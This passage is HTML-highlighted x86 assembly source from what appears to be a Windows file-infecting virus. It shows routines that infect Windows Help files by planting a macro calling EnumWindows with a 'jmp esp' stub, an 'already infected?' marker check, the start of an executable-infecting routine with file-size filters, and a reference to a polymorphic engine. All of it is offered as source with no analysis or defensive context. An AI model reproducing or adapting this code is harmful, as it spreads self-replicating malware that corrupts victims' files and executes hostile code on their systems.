   </span><span class="sc5">ih_next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ihck</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ihex</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ihdn</span><span class="sc0">
   </span><span class="sc5">ihex</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc5">ihdn</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ih_next</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ihcn</span><span class="sc0">
   </span><span class="sc5">ihck</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ihcv</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">iha1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">iha1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">ihax</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">rnd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">87654321h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd</span><span class="sc4">-</span><span class="sc5">infect_hlp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ihcv</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ihax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ihcv</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ihax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">ihcv</span><span class="sc4">:</span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">icva</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"'"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"`"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">icvf</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">icva</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">
   </span><span class="sc5">icvf</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">ihcn</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">org_ep</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc4">-</span><span class="sc5">hlp1_e</span><span class="sc4">+</span><span class="sc5">hlp1_e</span><span class="sc4">-</span><span class="sc5">hlp2_e</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc5">hlp1_e</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hlp2_sz</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;buffer</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-</span><span class="sc2">528</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">hlp1_s</span><span class="sc4">-</span><span class="sc5">hlp2_e</span><span class="sc4">-</span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">ih_free</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"`(RR"</span><span class="sc0">          </span><span class="sc1">;already infected?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ih_free</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">528</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">528</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">528</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">55</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ih_free</span><span class="sc0">

   </span><span class="sc5">spos</span><span class="sc4">:</span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpSetFilePointer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">read</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spos</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
   </span><span class="sc5">r_ts</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpReadFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">r_ts</span><span class="sc4">-</span><span class="sc5">infect_hlp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">write</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spos</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">r_ts</span><span class="sc4">-</span><span class="sc5">infect_hlp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ou! what does it mean :) ?</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">hlp1_s</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">label1</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RR(`USER32.DLL',`EnumWindows',`SU')"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">label1</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">p1</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"EnumWindows(`"</span><span class="sc0">
   </span><span class="sc5">hlp1_e</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"',0)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">hlp2_e</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
   </span><span class="sc5">hlp2_sz</span><span class="sc4">=</span><span class="sc5">hlp2_e</span><span class="sc4">-</span><span class="sc5">hlp1_e</span><span class="sc0">

   </span><span class="sc5">ih_free</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGlobalFree</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">ih_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">infect_hlp</span><span class="sc0">
</span><span class="sc5">infect_hlp</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">poly_engine</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc0">
</span><span class="sc5">infect_exe</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CreateFileA</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_failed</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGetFileSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ie_close</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">104857600</span><span class="sc0">
    </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">ie_close</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsize</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
